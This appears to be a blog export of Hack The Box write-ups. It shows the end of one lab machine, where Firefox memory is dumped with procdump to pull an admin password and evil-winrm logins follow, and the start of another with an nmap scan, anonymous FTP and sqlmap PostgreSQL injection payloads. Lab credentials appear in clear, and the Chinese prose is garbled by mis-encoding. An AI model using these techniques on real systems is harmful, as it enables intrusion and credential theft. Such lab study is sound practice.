WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>hazard:stealth1agent
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Administrator:stealth1agent
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Jason:stealth1agent
                                                                                      </code></pre>

<p>ä½¿ç”¨evil-winrm ç™»å½•ç”¨æˆ·</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ evil-winrm <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.10.149 <span class="token parameter variable">-u</span> Chase  <span class="token parameter variable">-p</span> <span class="token string">'Q4)sJu\Y8qz*A3?d'</span>
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' <span class="token keyword">for</span> module Reline
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
supportdesk<span class="token punctuation">\</span>chase
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token function">dir</span>

    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token punctuation">\</span>Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        <span class="token number">4</span>/22/2019   <span class="token number">9</span>:08 AM            <span class="token number">121</span> todo.txt
-ar---        <span class="token number">3</span>/22/2025   <span class="token number">9</span>:08 AM             <span class="token number">34</span> user.txt</code></pre>

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>æŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç°firefox </p>
<pre class="language-cmd" data-language="cmd"><code class="language-cmd">*Evil-WinRM* PS C:\Users\Chase&gt; ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    454      17     2264       5332               364   0 csrss
    291      13     2288       5168               480   1 csrss
    357      15     3480      14584              2468   1 ctfmon
    252      14     3936      13428              3832   0 dllhost
    166       9     1824       9748       0.02   6648   1 dllhost
    615      32    30096      57836               980   1 dwm
   1489      57    23924      78568              5088   1 explorer
   1053      69   143248     219100       2.95   6300   1 firefox
    347      19    10232      39812       0.03   6408   1 firefox
    401      33    31456      90444       0.34   6560   1 firefox
    378      28    22220      59020       0.16   6836   1 firefox
    355      25    16376      38944       0.05   7116   1 firefox
     49       6     1516       3872               788   0 fontdrvhost
     49       6     1804       4648               796   1 fontdrvhost
      0       0       56          8                 0   0 Idle
    &lt;...&gt;
    342      16     8352      18156              3972   0 WmiPrvSE
   2264      28    89968     107400       0.70   3004   0 wsmprovhost</code></pre>

<p>ä¸Šä¼ procdump64.exe å’Œstrings64.exe å¯¹firefox è¿›è¡Œdump</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token operator">></span> .<span class="token punctuation">\</span>procdump64.exe <span class="token parameter variable">-accepteula</span> <span class="token parameter variable">-ma</span> <span class="token number">6408</span>

ProcDump v11.0 - Sysinternals process dump utility
Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2009</span>-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

<span class="token punctuation">[</span><span class="token number">11</span>:07:56<span class="token punctuation">]</span> Dump <span class="token number">1</span> initiated: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token punctuation">\</span>firefox.exe_250322_110756.dmp
<span class="token punctuation">[</span><span class="token number">11</span>:07:56<span class="token punctuation">]</span> Dump <span class="token number">1</span> writing: Estimated dump <span class="token function">file</span> size is <span class="token number">289</span> MB.
<span class="token punctuation">[</span><span class="token number">11</span>:07:57<span class="token punctuation">]</span> Dump <span class="token number">1</span> complete: <span class="token number">289</span> MB written <span class="token keyword">in</span> <span class="token number">1.1</span> seconds
<span class="token punctuation">[</span><span class="token number">11</span>:07:58<span class="token punctuation">]</span> Dump count reached.
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token operator">></span> .<span class="token punctuation">\</span>strings64.exe <span class="token parameter variable">-accepteula</span> firefox.exe_250322_110756.dmp <span class="token operator">></span> firefox.exe_250322_110756.txt 
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chase<span class="token operator">></span> findstr <span class="token string">"password"</span> ./firefox.exe_250322_110756.txt
<span class="token assign-left variable">MOZ_CRASHREPORTER_RESTART_ARG_1</span><span class="token operator">=</span>localhost/login.php?login_username<span class="token operator">=</span>admin@support.htb<span class="token operator">&amp;</span><span class="token assign-left variable">login_password</span><span class="token operator">=</span>4dD<span class="token operator">!</span><span class="token number">5</span><span class="token punctuation">&#125;</span>x/re8<span class="token punctuation">]</span>FBuZ<span class="token operator">&amp;</span><span class="token assign-left variable">login</span><span class="token operator">=</span>                  
<span class="token assign-left variable">MOZ_CRASHREPORTER_RESTART_ARG_1</span><span class="token operator">=</span>localhost/login.php?login_username<span class="token operator">=</span>admin@support.htb<span class="token operator">&amp;</span><span class="token assign-left variable">login_password</span><span class="token operator">=</span>4dD<span class="token operator">!</span><span class="token number">5</span><span class="token punctuation">&#125;</span>x/re8<span class="token punctuation">]</span>FBuZ<span class="token operator">&amp;</span><span class="token assign-left variable">login</span><span class="token operator">=</span>                  
<span class="token assign-left variable">RG_1</span><span class="token operator">=</span>localhost/login.php?login_username<span class="token operator">=</span>admin@support.htb<span class="token operator">&amp;</span><span class="token assign-left variable">login_password</span><span class="token operator">=</span>4dD<span class="token operator">!</span><span class="token number">5</span><span class="token punctuation">&#125;</span>x/re8<span class="token punctuation">]</span>FBuZ<span class="token operator">&amp;</span><span class="token assign-left variable">login</span><span class="token operator">=</span>
<span class="token assign-left variable">MOZ_CRASHREPORTER_RESTART_ARG_1</span><span class="token operator">=</span>localhost/login.php?login_username<span class="token operator">=</span>admin@support.htb<span class="token operator">&amp;</span><span class="token assign-left variable">login_password</span><span class="token operator">=</span>4dD<span class="token operator">!</span><span class="token number">5</span><span class="token punctuation">&#125;</span>x/re8<span class="token punctuation">]</span>FBuZ<span class="token operator">&amp;</span><span class="token assign-left variable">login</span><span class="token operator">=</span>
browser.safebrowsing.passwords.enabled    
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>

<p>ä½¿ç”¨è·å–åˆ°çš„å¯†ç ç™»å½•ç›®æ ‡ï¼Œè·å–åˆ°ç®¡ç†å‘˜æƒé™</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ evil-winrm <span class="token parameter variable">-i</span> heist.htb <span class="token parameter variable">-u</span> administrator  <span class="token parameter variable">-p</span> <span class="token string">'4dD!5&#125;x/re8]FBuZ'</span>  
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' <span class="token keyword">for</span> module Reline
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token function">dir</span>

    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        <span class="token number">3</span>/22/2025   <span class="token number">9</span>:08 AM             <span class="token number">34</span> root.txt</code></pre>

<table>
<thead>
<tr>
<th>Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>Flag1</td>
<td>C:\Users\Chase\Desktop\user.txt</td>
</tr>
<tr>
<td>Flag2</td>
<td>C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>æœªæˆæƒè®¿é—®</tag>
        <tag>æ•æ„Ÿä¿¡æ¯æ³„æ¼</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Toolbox</title>
    <url>/Hackthebox/htb/htb-toolbox/</url>
    <content><![CDATA[<style>.ljjiyiikhgvv{zoom:50%;}</style><img src="/Hackthebox/htb/htb-toolbox/9d218e64149bfb00a002d94868f2e4b1.png" class="ljjiyiikhgvv">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.236 <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span>  tun0
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-21 <span class="token number">23</span>:36 CST
Warning: <span class="token number">10.10</span>.10.236 giving up on port because retransmission cap hit <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>.
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.236
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.18s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65521</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
<span class="token number">21</span>/tcp    <span class="token function">open</span>  <span class="token function">ftp</span>           FileZilla ftpd <span class="token number">0.9</span>.60 beta
<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
<span class="token operator">|</span>_-r-xr-xr-x <span class="token number">1</span> <span class="token function">ftp</span> <span class="token function">ftp</span>      <span class="token number">242520560</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> docker-toolbox.exe
<span class="token operator">|</span> ftp-syst: 
<span class="token operator">|</span>_  SYST: UNIX emulated by FileZilla
<span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>           OpenSSH for_Windows_7.7 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">443</span>/tcp   <span class="token function">open</span>  ssl/http      Apache httpd <span class="token number">2.4</span>.38 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-server-header: Apache/2.4.38 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
<span class="token operator">|</span> tls-alpn: 
<span class="token operator">|</span>_  http/1.1
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span>_http-title: MegaLogistics
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>admin.megalogistic.com/organizationName<span class="token operator">=</span>MegaLogistic Ltd/stateOrProvinceName<span class="token operator">=</span>Some-State/countryName<span class="token operator">=</span>GR
<span class="token operator">|</span> Not valid before: <span class="token number">2020</span>-02-18T17:45:56
<span class="token operator">|</span>_Not valid after:  <span class="token number">2021</span>-02-17T17:45:56
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">47001</span>/tcp <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49665</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49666</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49668</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49669</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2025</span>-03-21T15:20:37
<span class="token operator">|</span>_  start_date: N/A
<span class="token operator">|</span>_clock-skew: <span class="token parameter variable">-18m24s</span>
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">180.71</span> seconds
                                                                                         </code></pre>

<p>åœ¨443ç«¯å£å‘ç°<code>admin.megalogistic.com</code>ï¼Œæ·»åŠ æœ¬åœ°åŸŸåè§£æ</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.236  admin.megalogistic.com'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<p>ftp å…è®¸åŒ¿åç™»å½•ï¼Œç™»å½•åå¯ä»¥å‘ç° docker-toolbox.exe</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ftp</span> <span class="token number">10.10</span>.10.236 
Connected to <span class="token number">10.10</span>.10.236.
<span class="token number">220</span>-FileZilla Server <span class="token number">0.9</span>.60 beta
<span class="token number">220</span>-written by Tim Kosse <span class="token punctuation">(</span>tim.kosse@filezilla-project.org<span class="token punctuation">)</span>
<span class="token number">220</span> Please visit https://filezilla-project.org/
Name <span class="token punctuation">(</span><span class="token number">10.10</span>.10.236:kali<span class="token punctuation">)</span>: Anonymous
<span class="token number">331</span> Password required <span class="token keyword">for</span> anonymous
Password: 
<span class="token number">230</span> Logged on
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">dir</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">55341</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening data channel <span class="token keyword">for</span> directory listing of <span class="token string">"/"</span>
-r-xr-xr-x <span class="token number">1</span> <span class="token function">ftp</span> <span class="token function">ftp</span>      <span class="token number">242520560</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> docker-toolbox.exe
<span class="token number">226</span> Successfully transferred <span class="token string">"/"</span>
ftp<span class="token operator">></span> get docker-toolbox.exe
local: docker-toolbox.exe remote: docker-toolbox.exe
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">63234</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening data channel <span class="token keyword">for</span> <span class="token function">file</span> download from server of <span class="token string">"/docker-toolbox.exe"</span>
<span class="token number">100</span>% <span class="token operator">|</span>*****************************************************<span class="token operator">|</span>   <span class="token number">231</span> MiB  <span class="token number">617.76</span> KiB/s    00:00 ETA
<span class="token number">226</span> Successfully transferred <span class="token string">"/docker-toolbox.exe"</span>
<span class="token number">242520560</span> bytes received <span class="token keyword">in</span> 06:23 <span class="token punctuation">(</span><span class="token number">617.76</span> KiB/s<span class="token punctuation">)</span>
</code></pre>

<h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><p>è®¿é—®<code>admin.megalogistic.com</code>ï¼Œä½¿ç”¨burp æŠ“å–ç™»å½•æ•°æ®ï¼Œä½¿ç”¨sqlmapæµ‹è¯•ï¼Œå­˜åœ¨sqlæ³¨å…¥</p>
<img src="/Hackthebox/htb/htb-toolbox/image-20250322104959280.png" class="" title="ç™»å½•">

<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">admin.megalogistic.com</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=21c7525f49e68a4f7653422a03ddecfe</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">35</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua</span><span class="token punctuation">:</span> <span class="token header-value">"Chromium";v="133", "Not(A:Brand";v="99"</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua-Mobile</span><span class="token punctuation">:</span> <span class="token header-value">?0</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua-Platform</span><span class="token punctuation">:</span> <span class="token header-value">"Linux"</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">https://admin.megalogistic.com</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">same-origin</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">navigate</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-User</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">document</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://admin.megalogistic.com/</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Priority</span><span class="token punctuation">:</span> <span class="token header-value">u=0, i</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span>

username=admin&amp;password=11111111111</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">$ sqlmap <span class="token parameter variable">-r</span> megalogisic.txt <span class="token parameter variable">--batch</span> --force-ssl
        ___
       __H__
 ___ ___<span class="token punctuation">[</span>,<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.9</span>.2<span class="token comment">#stable&#125;</span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span>.<span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |
|___|_  ['</span><span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>
      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:56:30 /2025-03-21/

[23:56:30] [INFO] parsing HTTP request from '</span>megalogisic.txt<span class="token string">'
[23:56:30] [INFO] testing connection to the target URL
&lt;...>
[23:57:59] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '</span>--union-char<span class="token string">'? [Y/n] Y
POST parameter '</span>username<span class="token string">' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 95 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: username=admin'</span> AND <span class="token punctuation">(</span>SELECT <span class="token punctuation">(</span>CASE WHEN <span class="token punctuation">(</span><span class="token number">1444</span><span class="token operator">=</span><span class="token number">1444</span><span class="token punctuation">)</span> THEN NULL ELSE CAST<span class="token variable"><span class="token punctuation">((</span>CHR<span class="token punctuation">(</span><span class="token number">86</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">))</span></span> AS NUMERIC<span class="token punctuation">)</span> END<span class="token punctuation">))</span> IS NULL AND <span class="token string">'iHTD'</span><span class="token operator">=</span><span class="token string">'iHTD&amp;password=11111111111

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=admin'</span> AND <span class="token assign-left variable">9042</span><span class="token operator">=</span>CAST<span class="token variable"><span class="token punctuation">((</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">))</span></span><span class="token operator">||</span><span class="token punctuation">(</span>SELECT <span class="token punctuation">(</span>CASE WHEN <span class="token punctuation">(</span><span class="token number">9042</span><span class="token operator">=</span><span class="token number">9042</span><span class="token punctuation">)</span> THEN <span class="token number">1</span> ELSE <span class="token number">0</span> END<span class="token punctuation">))</span>::text<span class="token operator">||</span><span class="token punctuation">(</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">107</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">))</span> AS NUMERIC<span class="token punctuation">)</span> AND <span class="token string">'wDZN'</span><span class="token operator">=</span><span class="token string">'wDZN&amp;password=11111111111

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=admin'</span><span class="token punctuation">;</span>SELECT PG_SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>--<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token number">11111111111</span>

    Type: time-based blind
    Title: PostgreSQL <span class="token operator">></span> <span class="token number">8.1</span> AND time-based blind
    Payload: <span class="token assign-left variable">username</span><span class="token operator">=</span>admin<span class="token string">' AND 2617=(SELECT 2617 FROM PG_SLEEP(5)) AND '</span>AtXQ<span class="token string">'='</span>AtXQ<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token number">11111111111</span>
---
<span class="token punctuation">[</span><span class="token number">23</span>:58:12<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is PostgreSQL
web server operating system: Linux Debian <span class="token number">10</span> <span class="token punctuation">(</span>buster<span class="token punctuation">)</span>
web application technology: PHP <span class="token number">7.3</span>.14, Apache <span class="token number">2.4</span>.38
back-end DBMS: PostgreSQL
<span class="token punctuation">[</span><span class="token number">23</span>:58:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/home/kali/.local/share/sqlmap/output/admin.megalogistic.com'</span>

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">23</span>:58:17 /2025-03-21/
</code></pre>

<p>æ‰¾åˆ°adminç”¨æˆ·</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ sqlmap <span class="token parameter variable">-r</span> megalogisic.txt <span class="token parameter variable">--batch</span> --force-ssl <span class="token parameter variable">--dbms</span> PostgreSQL <span class="token parameter variable">--dump</span>
        ___
       __H__
 ___ ___<span class="token punctuation">[</span>,<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.9</span>.2<span class="token comment">#stable&#125;</span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ <span class="token number">23</span>:59:23 /2025-03-21/

<span class="token punctuation">[</span><span class="token number">23</span>:59:23<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> parsing HTTP request from <span class="token string">'megalogisic.txt'</span>
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
<span class="token punctuation">[</span><span class="token number">23</span>:59:41<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> no <span class="token function">clear</span> password<span class="token punctuation">(</span>s<span class="token punctuation">)</span> found                                                  
Database: public
Table: <span class="token function">users</span>
<span class="token punctuation">[</span><span class="token number">1</span> entry<span class="token punctuation">]</span>
+----------------------------------+----------+
<span class="token operator">|</span> password                         <span class="token operator">|</span> username <span class="token operator">|</span>
+----------------------------------+----------+
